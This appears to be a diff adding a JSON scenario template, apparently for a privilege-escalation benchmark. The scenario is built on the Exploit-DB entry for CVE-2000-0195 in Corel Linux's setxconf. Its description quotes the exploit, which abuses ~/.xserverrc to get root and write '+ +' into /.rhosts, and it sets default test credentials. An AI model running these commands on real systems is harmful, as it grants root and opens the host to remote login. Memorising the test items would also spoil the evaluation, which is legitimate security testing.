@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_19765",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: Corel Linux OS 1.0 - 'setxconf' Local Privilege Escalation (CVE-2000-0195;OSVDB-1231)\n\nExploit source code (19765.txt):\n```\nsource: https://www.securityfocus.com/bid/1008/info\n\nA vulnerability exists in the setxconf utility, as shipped with Corel Linux 1.0. The -T option to setxconf will run xinit, which euid root. xinit, when executed, will invoke the contents on ~/.xserverrc. A malicious user could therefore execute commands as root.\n\ncat > ~/.xserverrc\necho \"+ +\" > /.rhosts\n```",
+  "cve": "CVE-2000-0195;OSVDB-1231",
+  "exploitdb_id": "19765",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_19765",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
